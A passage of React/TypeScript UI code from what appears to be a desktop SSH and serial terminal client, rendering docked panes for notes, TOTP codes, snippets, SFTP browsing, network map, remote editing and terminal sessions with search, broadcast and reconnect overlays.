                prev.map((t) => (t.id === tab.id ? { ...t, activePaneId: node.id } : t))
              );
            }}
          >
            <div
              className="split-pane-header"
              draggable
              onDragStart={(e) => {
                e.stopPropagation();
                startWorkspaceDrag({
                  type: 'pane',
                  tabId: tab.id,
                  paneId: node.id,
                  title: node.title,
                });
              }}
              onDragEnd={() => startWorkspaceDrag(null)}
              title="Drag header to rearrange or dock New Connection pane"
            >
              <div className="pane-header-left">
                <span className="pane-drag-handle" aria-hidden="true">
                  <CyberIcon name="grip" size={12} />
                </span>
                <span className="pane-widget-icon">
                  <CyberIcon name="plus" size={13} />
                </span>
                <span className="pane-title-text" title={node.title}>
                  {node.title}
                </span>
              </div>
              <div className="pane-header-actions">
                {isPaneActive ? (
                  <span className="pane-active-indicator"><CyberIcon name="record" size={14} /> ACTIVE</span>
                ) : (
                  <span className="pane-inactive-hint">FOCUS</span>
                )}
                <button
                  type="button"
                  className="pane-undock-btn"
                  aria-label={`Split Horizontal ${node.title}`}
                  title="Open another New Connection split beside this pane"
                  onClick={(e) => {
                    e.stopPropagation();
                    handleOpenNewConnectionSplit('right', node.id);
                  }}
                >
                  <CyberIcon name="split-h" size={12} />
                </button>
                <button
                  type="button"
                  className="pane-undock-btn"
                  aria-label={`Split Vertical ${node.title}`}
                  title="Open another New Connection split below this pane"
                  onClick={(e) => {
                    e.stopPropagation();
                    handleOpenNewConnectionSplit('bottom', node.id);
                  }}
                >
                  <CyberIcon name="split-v" size={12} />
                </button>
                {totalPanes > 1 && (
                  <button
                    type="button"
                    className="pane-undock-btn"
                    aria-label={`Undock Pane ${node.title}`}
                    title="Undock pane into its own standalone tab"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleUndockPaneToTab(tab.id, node.id);
                    }}
                  >
                    <CyberIcon name="undock" size={12} />
                  </button>
                )}
                <button
                  type="button"
                  className="pane-close-btn"
                  aria-label={`Close Pane ${node.title}`}
                  title="Close New Connection Pane"
                  onClick={(e) => {
                    e.stopPropagation();
                    void handleClosePane(tab.id, node.id);
                  }}
                >
                  ×
                </button>
              </div>
            </div>
            <div className="launcher-pane-body">
              {renderNewConnectionLauncher({
                tabId: tab.id,
                paneId: node.id,
                isPrimary: isPrimaryLauncher,
              })}
            </div>
            {renderPaneDropOverlay(tab, node)}
          </div>
        );
      }

      if (node.paneType === 'notes') {
        const targetHostId = node.notesHostId || node.hostId || '';
        return (
          <div
            key={node.id}
            className={`split-pane split-notes-pane ${isPaneActive ? 'active' : ''} ${isDragSource ? 'is-dragging-pane' : ''}`}
            aria-label={`Notes Pane ${node.title}`}
            {...commonPaneDragEvents}
            onClick={() => {
              setTabs((prev) =>
                prev.map((t) => (t.id === tab.id ? { ...t, activePaneId: node.id } : t))
              );
            }}
          >
            <HostNotesDrawer
              isOpen={true}
              isPinned={true}
              hostId={targetHostId}
              notes={notes}
              hosts={vaultSummary.hosts.map((h) => ({
                id: h.id,
                label: h.label,
                address: h.address,
              }))}
              onSaveNote={handleSaveNote}
              onDeleteNote={handleDeleteNote}
              onClose={() => void handleClosePane(tab.id, node.id)}
              onOpenFullNotes={() => openNotesTab(targetHostId || undefined)}
              onHeaderDragStart={(e) => {
                e.stopPropagation();
                startWorkspaceDrag({
                  type: 'pane',
                  tabId: tab.id,
                  paneId: node.id,
                  title: node.title,
                });
              }}
              onHeaderDragEnd={() => startWorkspaceDrag(null)}
            />
            {renderPaneDropOverlay(tab, node)}
          </div>
        );
      }

      if (node.paneType === 'totp' || node.paneType === 'snippets' || node.paneType === 'sftp') {
        return (
          <div
            key={node.id}
            className={`split-pane split-widget-pane ${isPaneActive ? 'active' : ''} ${isDragSource ? 'is-dragging-pane' : ''}`}
            aria-label={`Pane ${node.title}`}
            {...commonPaneDragEvents}
            onClick={() => {
              setTabs((prev) =>
                prev.map((t) => (t.id === tab.id ? { ...t, activePaneId: node.id } : t))
              );
            }}
          >
            <div
              className="split-pane-header"
              draggable
              onDragStart={(e) => {
                e.stopPropagation();
                startWorkspaceDrag({
                  type: 'pane',
                  tabId: tab.id,
                  paneId: node.id,
                  title: node.title,
                });
              }}
              onDragEnd={() => startWorkspaceDrag(null)}
              title="Drag header to rearrange or dock pane"
            >
              <div className="pane-header-left">
                <span className="pane-drag-handle" aria-hidden="true">
                  <CyberIcon name="grip" size={12} />
                </span>
                <span className="pane-widget-icon">
                  <CyberIcon
                    name={
                      node.paneType === 'totp'
                        ? 'totp'
                        : node.paneType === 'snippets'
                          ? 'bolt'
                          : 'folder'
                    }
                    size={13}
                  />
                </span>
                <span className="pane-title-text" title={node.title}>
                  {node.title}
                </span>
              </div>
              <div className="pane-header-actions">
                {isPaneActive ? (
                  <span className="pane-active-indicator"><CyberIcon name="record" size={14} /> ACTIVE</span>
                ) : (
                  <span className="pane-inactive-hint">FOCUS</span>
                )}
                {totalPanes > 1 && (
                  <button
                    type="button"
                    className="pane-undock-btn"
                    aria-label={`Undock Pane ${node.title}`}
                    title="Undock pane into its own standalone tab"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleUndockPaneToTab(tab.id, node.id);
                    }}
                  >
                    <CyberIcon name="undock" size={12} />
                  </button>
                )}
                <button
                  type="button"
                  className="pane-close-btn"
                  aria-label={`Close Pane ${node.title}`}
                  title="Close Docked Pane"
                  onClick={(e) => {
                    e.stopPropagation();
                    void handleClosePane(tab.id, node.id);
                  }}
                >
                  ×
                </button>
              </div>
            </div>
            <div className="docked-widget-body">
              {node.paneType === 'totp' ? (
                <TotpManagerModal
                  isOpen={true}
                  isDocked={true}
                  hosts={vaultSummary.hosts.map((h) => ({
                    id: h.id,
                    label: h.label,
                    address: `${h.effectiveUser}@${h.address}:${h.effectivePort}`,
                  }))}
                  activeSessionId={sessionId}
                  onInjectCode={handleInjectTotp}
                  onRefreshVault={refreshVaultState}
                  onClose={() => void handleClosePane(tab.id, node.id)}
                />
              ) : node.paneType === 'snippets' ? (
                <SnippetsManagerModal
                  isDocked={true}
                  snippets={mergedSnippets}
                  onSaveSnippet={handleSaveSnippet}
                  onDeleteSnippet={handleDeleteSnippet}
                  getFileConfig={async () => {
                    const api = getWailsBindings();
                    if (api?.GetSnippetsConfig) return api.GetSnippetsConfig();
                    return { filePath: 'command_snippets.json', snippetCount: mergedSnippets.length, exists: false };
                  }}
                  setFilePath={async (path) => {
                    const api = getWailsBindings();
                    if (api?.SetSnippetsPath) return api.SetSnippetsPath(path);
                    throw new Error('SetSnippetsPath API not available');
                  }}
                  onReloadFromFile={async () => {
                    const api = getWailsBindings();
                    if (api?.ListSnippetsFromFile) {
                      const loaded = await api.ListSnippetsFromFile();
                      setExternalSnippets(loaded || []);
                      return loaded || [];
                    }
                    return [];
                  }}
                  onRunSnippet={(snip) => {
                    const targetTermPane =
                      collectPanes(tab.rootNode).find(
                        (p) => !p.paneType || p.paneType === 'terminal'
                      ) || activePane;
                    void handleTriggerSnippet(snip, targetTermPane?.sessionId || '');
                  }}
                  onClose={() => void handleClosePane(tab.id, node.id)}
                />
              ) : (
                <SftpBrowserView
                  sessionId={
                    node.sftpSessionId ||
                    collectPanes(tab.rootNode).find(
                      (p) => !p.paneType || p.paneType === 'terminal'
                    )?.sessionId ||
                    node.sessionId
                  }
                  hostLabel={node.title.replace('SFTP: ', '')}
                  api={{
                    listLocalDir: (p) =>
                      getWailsBindings()?.ListLocalDir?.(p) ?? Promise.resolve([]),
                    listRemoteDir: (sid, p) =>
                      getWailsBindings()?.ListRemoteDir?.(sid, p) ?? Promise.resolve([]),
                    startSftpUpload: (sid, l, r) =>
                      getWailsBindings()?.StartSftpUpload?.(sid, l, r) ?? Promise.resolve(''),
                    startSftpDownload: (sid, r, l) =>
                      getWailsBindings()?.StartSftpDownload?.(sid, r, l) ?? Promise.resolve(''),
                    createRemoteDir: (sid, p) =>
                      getWailsBindings()?.CreateRemoteDir?.(sid, p) ?? Promise.resolve(),
                    deleteRemoteItem: (sid, p) =>
                      getWailsBindings()?.DeleteRemoteItem?.(sid, p) ?? Promise.resolve(),
                    cancelTransfer: (tid) =>
                      getWailsBindings()?.CancelTransfer?.(tid) ?? Promise.resolve(),
                    getActiveTransfers: () =>
                      getWailsBindings()?.GetActiveTransfers?.() ?? Promise.resolve([]),
                    startRemoteEdit: (sid, p) =>
                      getWailsBindings()?.StartRemoteEdit?.(sid, p) ??
                      Promise.reject(new Error('StartRemoteEdit unavailable')),
                  }}
                  eventsOn={getWailsRuntime()?.EventsOn}
                  onClose={() => void handleClosePane(tab.id, node.id)}
                  onOpenRemoteEdit={(sess) => {
                    openRemoteEditorTab(sess, node.hostId || tab.hostId);
                  }}
                />
              )}
            </div>
            {renderPaneDropOverlay(tab, node)}
          </div>
        );
      }

      if (node.paneType === 'network-map') {
        return (
          <div
            key={node.id}
            className={`split-pane split-widget-pane split-netmap-pane ${isPaneActive ? 'active' : ''} ${isDragSource ? 'is-dragging-pane' : ''}`}
            aria-label={`Network Map Pane ${node.title}`}
            {...commonPaneDragEvents}
            onClick={() => {
              setTabs((prev) =>
                prev.map((t) => (t.id === tab.id ? { ...t, activePaneId: node.id } : t))
              );
            }}
          >
            <div
              className="split-pane-header"
              draggable
              onDragStart={(e) => {
                e.stopPropagation();
                startWorkspaceDrag({
                  type: 'pane',
                  tabId: tab.id,
                  paneId: node.id,
                  title: node.title,
                });
              }}
              onDragEnd={() => startWorkspaceDrag(null)}
              title="Drag header to rearrange or dock pane"
            >
              <div className="pane-header-left">
                <span className="pane-drag-handle" aria-hidden="true">
                  <CyberIcon name="grip" size={12} />
                </span>
                <span className="pane-widget-icon">
                  <CyberIcon name="network" size={13} />
                </span>
                <span className="pane-title-text" title={node.title}>
                  {node.title}
                </span>
              </div>
              <div className="pane-header-actions">
                {isPaneActive ? (
                  <span className="pane-active-indicator"><CyberIcon name="record" size={14} /> ACTIVE</span>
                ) : (
                  <span className="pane-inactive-hint">FOCUS</span>
                )}
                {totalPanes > 1 && (
                  <button
                    type="button"
                    className="pane-undock-btn"
                    aria-label={`Undock Pane ${node.title}`}
                    title="Undock pane into its own standalone tab"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleUndockPaneToTab(tab.id, node.id);
                    }}
                  >
                    <CyberIcon name="undock" size={12} />
                  </button>
                )}
                <button
                  type="button"
                  className="pane-close-btn"
                  aria-label={`Close Pane ${node.title}`}
                  title="Close Docked Pane"
                  onClick={(e) => {
                    e.stopPropagation();
                    void handleClosePane(tab.id, node.id);
                  }}
                >
                  ×
                </button>
              </div>
            </div>
            <div className="docked-widget-body" style={{ flex: 1, minHeight: 0 }}>
              <NetworkMapView
                hosts={vaultSummary.hosts}
                groups={vaultSummary.groups}
                notes={notes}
                proxyProfiles={vaultSummary.proxyProfiles}
                activeSessionHostIds={getActiveSessionHostIds()}
                activeTunnels={activeTunnels}
                forwardRules={forwardRules}
                onConnectHost={(hostId) => {
                  const h = vaultSummary.hosts.find((x) => x.id === hostId);
                  if (h) void handleConnectSavedHost(h);
                }}
                onSplitConnectHost={(hostId) => {
                  const h = vaultSummary.hosts.find((x) => x.id === hostId);
                  if (h) void handleConnectHostIntoSplit(h, 'right');
                }}
                onOpenSftp={(hostId) => {
                  const h = vaultSummary.hosts.find((x) => x.id === hostId);
                  if (h) void handleOpenHostSftp(h);
                }}
                onOpenNotes={(hostId) => openNotesTab(hostId)}
                onStartTunnel={handleStartTunnelWithHost}
                onStopTunnel={handleStopForwardTunnel}
                onOpenForwardingManager={(hostId) => {
                  setForwardingModalHostId(hostId);
                  setShowPortForwardingModal(true);
                }}
                onClose={() => void handleClosePane(tab.id, node.id)}
                isDocked={true}
              />
            </div>
            {renderPaneDropOverlay(tab, node)}
          </div>
        );
      }

      if (node.paneType === 'editor') {
        const editSession: RemoteEditSession = {
          id: node.editSessionId || node.sessionId.replace('editor-', ''),
          sessionId: node.sessionId,
          remotePath: node.editRemotePath || '',
          localPath: '',
          filename: node.title.replace('Edit: ', ''),
          initialModTime: 0,
          initialSize: 0,
          initialHash: '',
          status: 'active',
          lastUploadedAt: 0,
          hasConflict: false,
        };
        return (
          <div
            key={node.id}
            className={`split-pane split-widget-pane split-editor-pane ${isPaneActive ? 'active' : ''} ${isDragSource ? 'is-dragging-pane' : ''}`}
            aria-label={`Remote Editor Pane ${node.title}`}
            {...commonPaneDragEvents}
            onClick={() => {
              setTabs((prev) =>
                prev.map((t) => (t.id === tab.id ? { ...t, activePaneId: node.id } : t))
              );
            }}
          >
            <div
              className="split-pane-header"
              draggable
              onDragStart={(e) => {
                e.stopPropagation();
                startWorkspaceDrag({
                  type: 'pane',
                  tabId: tab.id,
                  paneId: node.id,
                  title: node.title,
                });
              }}
              onDragEnd={() => startWorkspaceDrag(null)}
              title="Drag header to rearrange or dock pane"
            >
              <div className="pane-header-left">
                <span className="pane-drag-handle" aria-hidden="true">
                  <CyberIcon name="grip" size={12} />
                </span>
                <span className="pane-widget-icon">
                  <CyberIcon name="edit" size={13} />
                </span>
                <span className="pane-title-text" title={node.title}>
                  {node.title}
                </span>
              </div>
              <div className="pane-header-actions">
                {isPaneActive ? (
                  <span className="pane-active-indicator"><CyberIcon name="record" size={14} /> ACTIVE</span>
                ) : (
                  <span className="pane-inactive-hint">FOCUS</span>
                )}
                {totalPanes > 1 && (
                  <button
                    type="button"
                    className="pane-undock-btn"
                    aria-label={`Undock Pane ${node.title}`}
                    title="Undock pane into its own standalone tab"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleUndockPaneToTab(tab.id, node.id);
                    }}
                  >
                    <CyberIcon name="undock" size={12} />
                  </button>
                )}
                <button
                  type="button"
                  className="pane-close-btn"
                  aria-label={`Close Pane ${node.title}`}
                  title="Close Docked Editor Pane"
                  onClick={(e) => {
                    e.stopPropagation();
                    void handleClosePane(tab.id, node.id);
                  }}
                >
                  ×
                </button>
              </div>
            </div>
            <div className="docked-widget-body" style={{ flex: 1, minHeight: 0 }}>
              <RemoteEditorView
                editSession={editSession}
                api={{
                  GetRemoteEditContent: (eid) =>
                    getWailsBindings()?.GetRemoteEditContent?.(eid) ?? Promise.resolve(''),
                  SaveRemoteEditContent: (eid, content, force) =>
                    getWailsBindings()?.SaveRemoteEditContent?.(eid, content, force) ??
                    Promise.resolve({ success: true, conflict: false, remoteModTime: 0, remoteSize: 0, message: '' }),
                  CheckRemoteConflict: (eid) =>
                    getWailsBindings()?.CheckRemoteConflict?.(eid) ??
                    Promise.resolve({ hasConflict: false, remotePath: '', initialModTime: 0, remoteModTime: 0, initialSize: 0, remoteSize: 0, message: '' }),
                  OpenExternalEditor: (eid) =>
                    getWailsBindings()?.OpenExternalEditor?.(eid) ?? Promise.resolve(),
                  CloseRemoteEdit: (eid) =>
                    getWailsBindings()?.CloseRemoteEdit?.(eid) ?? Promise.resolve(),
                }}
                eventsOn={getWailsRuntime()?.EventsOn}
                onClose={() => void handleClosePane(tab.id, node.id)}
                isSplitPane={true}
              />
            </div>
            {renderPaneDropOverlay(tab, node)}
          </div>
        );
      }

      const currentSize = paneFontSizes.get(node.sessionId) || globalSettings.fontSize;
      const isBroadcastingThis = getBroadcastTargetSessionIds().includes(node.sessionId);
      return (
        <div
          key={node.id}
          className={`split-pane ${isPaneActive ? 'active' : ''} ${isBroadcastingThis ? 'is-broadcasting' : ''} ${isDragSource ? 'is-dragging-pane' : ''}`}
          aria-label={`Pane ${node.title}`}
          {...commonPaneDragEvents}
          onClick={() => {
            setTabs((prev) =>
              prev.map((t) => (t.id === tab.id ? { ...t, activePaneId: node.id } : t))
            );
            focusersRef.current.get(node.sessionId)?.();
          }}
        >
          <div
            className="split-pane-header"
            draggable
            onDragStart={(e) => {
              e.stopPropagation();
              startWorkspaceDrag({
                type: 'pane',
                tabId: tab.id,
                paneId: node.id,
                title: node.title,
              });
            }}
            onDragEnd={() => startWorkspaceDrag(null)}
            title="Drag header to rearrange, swap, or snap split panes"
          >
            <div className="pane-header-left">
              <span className="pane-drag-handle" aria-hidden="true">
                <CyberIcon name="grip" size={12} />
              </span>
              {(() => {
                const isSessionAlive = liveSessions.has(node.sessionId);
                const isConnecting = connectingPaneIds.has(node.id);
                const ledClass = isSessionAlive
                  ? 'live-green'
                  : isConnecting
                    ? 'connecting'
                    : 'offline-red';
                const ledTitle = isSessionAlive
                  ? 'Session Active (Connected)'
                  : isConnecting
                    ? 'Connecting to host...'
                    : node.hostId
                      ? 'Session Disconnected — Click to connect'
                      : 'Disconnected';

                return (
                  <span
                    className={`pane-led ${ledClass}`}
                    title={ledTitle}
                    onClick={
                      !isSessionAlive && node.hostId
                        ? (e) => {
                          e.stopPropagation();
                          void handleConnectPane(node, tab.id);
                        }
                        : undefined
                    }
                    role={!isSessionAlive && node.hostId ? 'button' : undefined}
                    aria-label={ledTitle}
                  />
                );
              })()}
              <span
                className={`pane-focus-dot ${isPaneActive ? 'active' : ''}`}
                title={isPaneActive ? 'Active Pane' : 'Click to focus'}
              />
              {isBroadcastingThis && (
                <span className="pane-broadcast-badge" title="Broadcast Input ACTIVE on this pane">
                  BROADCAST
                </span>
              )}
              {reconnectStates.has(node.id) && (
                <span className="pane-reconnect-badge" title="Auto-reconnect active">
                  <CyberIcon name="bolt" size={10} /> RECONNECTING ({reconnectStates.get(node.id)?.countdown}s)
                </span>
              )}
              <span className="pane-title-text" title={node.title}>
                {node.title}
              </span>
              {(node.cwd || getSessionCwd(node.sessionId)) && (
                <span
                  className="pane-cwd-pill"
                  title={`Current working directory: ${node.cwd || getSessionCwd(node.sessionId)}`}
                >
                  <CyberIcon name="folder" size={10} /> {node.cwd || getSessionCwd(node.sessionId)}
                </span>
              )}
            </div>
            <div className="pane-header-actions">
              {node.sessionId.startsWith('serial-') && (
                <div className="serial-pin-controls">
                  <button
                    type="button"
                    className={`serial-pin-btn ${(serialPinStates.get(node.sessionId)?.dtr ?? true) ? 'active' : ''}`}
                    title="Toggle DTR (Data Terminal Ready)"
                    aria-label={`Toggle DTR for ${node.title}`}
                    onClick={(e) => {
                      e.stopPropagation();
                      void handleToggleDTR(node.sessionId);
                    }}
                  >
                    DTR
                  </button>
                  <button
                    type="button"
                    className={`serial-pin-btn ${(serialPinStates.get(node.sessionId)?.rts ?? true) ? 'active' : ''}`}
                    title="Toggle RTS (Request To Send)"
                    aria-label={`Toggle RTS for ${node.title}`}
                    onClick={(e) => {
                      e.stopPropagation();
                      void handleToggleRTS(node.sessionId);
                    }}
                  >
                    RTS
                  </button>
                  <button
                    type="button"
                    className="serial-break-btn"
                    title="Send hardware Break signal"
                    aria-label={`Send Break for ${node.title}`}
                    onClick={(e) => {
                      e.stopPropagation();
                      void handleSendSerialBreak(node.sessionId);
                    }}
                  >
                    <CyberIcon name="bolt" size={11} /> BRK
                  </button>
                  <button
                    type="button"
                    className={`pane-signal-btn ${activeSignalAnalyzers.has(node.sessionId) ? 'active' : ''}`}
                    title="Toggle Saleae-style Signal & Logic Analyzer"
                    aria-label={`Toggle Signal Analyzer for ${node.title}`}
                    onClick={(e) => {
                      e.stopPropagation();
                      setActiveSignalAnalyzers((prev) => {
                        const next = new Set(prev);
                        if (next.has(node.sessionId)) {
                          next.delete(node.sessionId);
                        } else {
                          next.add(node.sessionId);
                        }
                        return next;
                      });
                    }}
                  >
                    <CyberIcon name="wave" size={11} />
                  </button>
                </div>
              )}
              <div className="pane-zoom-group">
                <button
                  type="button"
                  className="pane-zoom-btn"
                  aria-label={`Zoom out ${node.title}`}
                  title="Zoom out (Ctrl -)"
                  onClick={(e) => {
                    e.stopPropagation();
                    const next = changeTerminalFontSize(node.sessionId, -1);
                    setPaneFontSizes((prev) => new Map(prev.set(node.sessionId, next)));
                  }}
                >
                  -
                </button>
                <span className="pane-font-badge" title="Font size (Ctrl + / -)">
                  {currentSize}px
                </span>
                <button
                  type="button"
                  className="pane-zoom-btn"
                  aria-label={`Zoom in ${node.title}`}
                  title="Zoom in (Ctrl +)"
                  onClick={(e) => {
                    e.stopPropagation();
                    const next = changeTerminalFontSize(node.sessionId, +1);
                    setPaneFontSizes((prev) => new Map(prev.set(node.sessionId, next)));
                  }}
                >
                  +
                </button>
              </div>
              <button
                type="button"
                className={`pane-hud-btn ${searchOpenPanes.has(node.sessionId) ? 'active' : ''}`}
                aria-label={`Find in ${node.title}`}
                title="Find in terminal (Ctrl+F)"
                onClick={(e) => {
                  e.stopPropagation();
                  togglePaneSearch(node.sessionId);
                }}
              >
                <CyberIcon name="search" size={12} />
              </button>
              {!node.sessionId.startsWith('local-') && !node.sessionId.startsWith('serial-') && (
                <button
                  type="button"
                  className="pane-hud-btn"
                  aria-label={`Open SFTP for ${node.title}`}
                  title="Open SFTP File Browser"
                  onClick={(e) => {
                    e.stopPropagation();
                    openSftpTab(node.sessionId, node.title, node.hostId);
                  }}
                >
                  <CyberIcon name="folder" size={12} />
                </button>
              )}
              <button
                type="button"
                className={`pane-hud-btn pane-rec-btn ${activeLogSessions.has(node.sessionId) ? 'recording' : ''}`}
                aria-label={`Toggle Session Logging for ${node.title}`}
                title="Toggle Timestamped Session Logging"
                onClick={(e) => {
                  e.stopPropagation();
                  void handleToggleSessionLog(node.sessionId, node.title, node.hostId);
                }}
              >
                <CyberIcon name="record" size={10} />
                <span className="sr-only">
                  {activeLogSessions.has(node.sessionId) ? <><CyberIcon name="record" size={14} /> REC</> : 'Log'}
                </span>
                {activeLogSessions.has(node.sessionId) && (
                  <span className="hud-micro-tag">REC</span>
                )}
              </button>
              <button
                type="button"
                className={`pane-hud-btn pane-broadcast-btn ${isBroadcastingThis ? 'active' : ''}`}
                aria-label={`Toggle Broadcast for ${node.title}`}
                title={
                  isBroadcastingThis
                    ? 'Terminal is receiving broadcast input. Click to toggle.'
                    : 'Click to add terminal to broadcast group.'
                }
                onClick={(e) => {
                  e.stopPropagation();
                  handleToggleSessionBroadcast(node.sessionId);
                }}
              >
                <CyberIcon name="broadcast" size={12} />
                <span className="sr-only">{isBroadcastingThis ? 'ACTIVE' : 'Cast'}</span>
                {isBroadcastingThis && <span className="hud-micro-tag">CAST</span>}
              </button>
              {node.hostId && (
                <div className="pane-notes-group">
                  <button
                    type="button"
                    className={`pane-hud-btn ${openNotesDrawerHostId === node.hostId ? 'active' : ''}`}
                    aria-label={`Toggle Host Notes for ${node.title}`}
                    title="Toggle Host Notes Drawer"
                    onClick={(e) => {
                      e.stopPropagation();
                      const hid = node.hostId ?? '';
                      setOpenNotesDrawerHostId((prev) => (prev === hid ? null : hid));
                    }}
                  >
                    <CyberIcon name="note" size={12} />
                  </button>
                </div>
              )}
              {totalPanes > 1 && (
                <>
                  <button
                    type="button"
                    className="pane-undock-btn"
                    aria-label={`Undock Pane ${node.title}`}
                    title="Undock pane into its own standalone tab"
                    onClick={(e) => {
                      e.stopPropagation();
                      handleUndockPaneToTab(tab.id, node.id);
                    }}
                  >
                    <CyberIcon name="undock" size={12} />
                  </button>
                  <button
                    type="button"
                    className="pane-close-btn"
                    aria-label={`Close Pane ${node.title}`}
                    title="Close Split Pane"
                    onClick={(e) => {
                      e.stopPropagation();
                      void handleClosePane(tab.id, node.id);
                    }}
                  >
                    ×
                  </button>
                </>
              )}
            </div>
          </div>

          {searchOpenPanes.has(node.sessionId) &&
            (() => {
              const searchState = paneSearchStates.get(node.sessionId) || {
                query: '',
                caseSensitive: false,
                wholeWord: false,
                regex: false,
                resultFound: null,
              };
              return (
                <div
                  className="terminal-search-overlay"
                  role="search"
                  aria-label={`Search Bar ${node.title}`}
                  onClick={(e) => e.stopPropagation()}
                >
                  <div className="search-input-wrapper">
                    <input
                      aria-label="Search Terminal"
                      placeholder="Find in terminal..."
                      autoFocus
                      value={searchState.query}
                      onChange={(e) => {
                        const q = e.target.value;
                        updatePaneSearchState(node.sessionId, { query: q });
                        executePaneSearch(node.sessionId, 'next', { query: q });
                      }}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter') {
                          e.preventDefault();
                          executePaneSearch(node.sessionId, e.shiftKey ? 'prev' : 'next');
                        } else if (e.key === 'Escape') {
                          e.preventDefault();
                          closePaneSearch(node.sessionId);
                        }
                      }}
                    />
                  </div>

                  <button
                    type="button"
                    className="search-nav-btn"
                    aria-label="Previous Match"
                    title="Previous Match (Shift+Enter)"
                    onClick={() => executePaneSearch(node.sessionId, 'prev')}
                  >
                    <CyberIcon name="chevron-up" size={14} />
                  </button>
                  <button
                    type="button"
                    className="search-nav-btn"
                    aria-label="Next Match"
                    title="Next Match (Enter)"
                    onClick={() => executePaneSearch(node.sessionId, 'next')}
                  >
                    <CyberIcon name="chevron-down" size={14} />
                  </button>

                  <button
                    type="button"
                    className={`search-opt-btn ${searchState.caseSensitive ? 'active' : ''}`}
                    aria-label="Match Case"
                    title="Match Case (Case Sensitive)"
                    onClick={() => {
                      const nextVal = !searchState.caseSensitive;
                      updatePaneSearchState(node.sessionId, { caseSensitive: nextVal });
                      executePaneSearch(node.sessionId, 'next', { caseSensitive: nextVal });
                    }}
                  >
                    Aa
                  </button>

                  <button
                    type="button"
                    className={`search-opt-btn ${searchState.wholeWord ? 'active' : ''}`}
                    aria-label="Match Whole Word"
                    title="Match Whole Word"
                    onClick={() => {
                      const nextVal = !searchState.wholeWord;
                      updatePaneSearchState(node.sessionId, { wholeWord: nextVal });
                      executePaneSearch(node.sessionId, 'next', { wholeWord: nextVal });
                    }}
                  >
                    \b
                  </button>

                  <button
                    type="button"
                    className={`search-opt-btn ${searchState.regex ? 'active' : ''}`}
                    aria-label="Use Regular Expression"
                    title="Use Regular Expression"
                    onClick={() => {
                      const nextVal = !searchState.regex;
                      updatePaneSearchState(node.sessionId, { regex: nextVal });
                      executePaneSearch(node.sessionId, 'next', { regex: nextVal });
                    }}
                  >
                    .*
                  </button>

                  {searchState.query && (
                    <span className="search-result-badge">
                      {searchState.resultFound === true
                        ? 'Found'
                        : searchState.resultFound === false
                          ? 'No match'
                          : ''}
                    </span>
                  )}

                  <button
                    type="button"
                    className="search-close-btn"
                    aria-label="Close Search"
                    title="Close Search (Escape)"
                    onClick={() => closePaneSearch(node.sessionId)}
                  >
                    ×
                  </button>
                </div>
              );
            })()}

          <TerminalView
            sessionId={node.sessionId}
            onInput={handleTerminalInput}
            onResize={handleTerminalResize}
            registerWriter={registerWriter}
            registerFocuser={registerFocuser}
            settings={globalSettings}
            onFontSizeChange={handleFontSizeChange}
            onToggleSearch={togglePaneSearch}
            onSelectionContextMenu={handleTerminalSelectionContextMenu}
            isRawTcp={node.isRawTcp}
            rawTcpHost={node.rawTcpHost}
            rawTcpPort={node.rawTcpPort}
            initialLineMode={node.initialLineMode}
            initialLineEnding={node.initialLineEnding}
            onCwdChange={(sid, cwd) => {
              setSessionCwd(sid, cwd);
              setTabs((prev) =>
                prev.map((t) => {
                  if (t.id !== tab.id) {
                    return t;
                  }
                  const updateNodeCwd = (n: WorkspaceNode): WorkspaceNode => {
                    if (n.type === 'pane') {
                      if (n.sessionId === sid) {
                        return { ...n, cwd };
                      }
                      return n;
                    }
                    return { ...n, children: n.children.map(updateNodeCwd) };
                  };
                  return { ...t, rootNode: updateNodeCwd(t.rootNode) };
                })
              );
            }}
          />

          {node.sessionId.startsWith('serial-') && activeSignalAnalyzers.has(node.sessionId) && (
            <SignalAnalyzerView
              sessionId={node.sessionId}
              port={serialConfig.port}
              baudRate={serialConfig.baudRate}
              dtr={serialPinStates.get(node.sessionId)?.dtr ?? true}
              rts={serialPinStates.get(node.sessionId)?.rts ?? true}
              rxDataFeed={lastRxDataRef.current.get(node.sessionId)}
              txDataFeed={lastTxDataRef.current.get(node.sessionId)}
              onClose={() => {
                setActiveSignalAnalyzers((prev) => {
                  const next = new Set(prev);
                  next.delete(node.sessionId);
                  return next;
                });
              }}
            />
          )}

          {!reconnectStates.has(node.id) && !liveSessions.has(node.sessionId) && node.hostId && (
            <div
              className="terminal-offline-overlay"
              role="button"
              tabIndex={0}
              aria-label={`Disconnected. Click to connect to ${node.title}`}
              onClick={(e) => {
                e.stopPropagation();
                void handleConnectPane(node, tab.id);
              }}
              onKeyDown={(e) => {
                if (e.key === 'Enter' || e.key === ' ') {
                  e.preventDefault();
                  void handleConnectPane(node, tab.id);
                }
              }}
              title={`Click to connect session to ${node.title}`}
            >
              <div className="terminal-offline-badge">
                <span
                  className={`pane-led ${connectingPaneIds.has(node.id) ? 'connecting' : 'offline-red'}`}
                />
                <span className="terminal-offline-title">
                  /// OFFLINE · SESSION DISCONNECTED ///
                </span>
                <span className="terminal-offline-action">
                  {connectingPaneIds.has(node.id) ? 'CONNECTING...' : 'CLICK TO CONNECT'}
                </span>
              </div>
            </div>
          )}

          {reconnectStates.has(node.id) && (() => {
            const rc = reconnectStates.get(node.id);
            if (!rc) return null;
            const isFailed = rc.status === 'failed';
            const isConnecting = !isFailed && rc.countdown === 0;
            return (
              <div
                className="pane-reconnect-overlay"
                role="alert"
                aria-label={`Reconnect overlay for ${node.title}`}
                onClick={(e) => e.stopPropagation()}
              >
                <div className={`reconnect-hud-card ${isFailed ? 'is-failed' : ''}`}>
                  <div className="reconnect-header">
                    <span className="reconnect-pulse-icon">
                      <CyberIcon name={isFailed ? 'close' : 'bolt'} size={18} />
                    </span>
                    <h4>{isFailed ? 'Connection Terminated' : 'Connection Dropped'}</h4>
                  </div>
                  <p className="reconnect-subtext">
                    {isFailed ? (
                      `Auto-reconnect failed after ${rc.maxAttempts} attempts.`
                    ) : isConnecting ? (
                      <>
                        Reconnecting to <strong>{node.title}</strong>... (Attempt {rc.attempt}/{rc.maxAttempts})
                      </>
                    ) : (
                      <>
                        Reconnecting to <strong>{node.title}</strong> in{' '}
                        <strong>{rc.countdown}s</strong> (Attempt {rc.attempt}/{rc.maxAttempts})
                      </>
                    )}
                  </p>
                  {rc.reason && (
                    <span className="reconnect-reason-badge" title={rc.reason}>
                      {rc.reason}
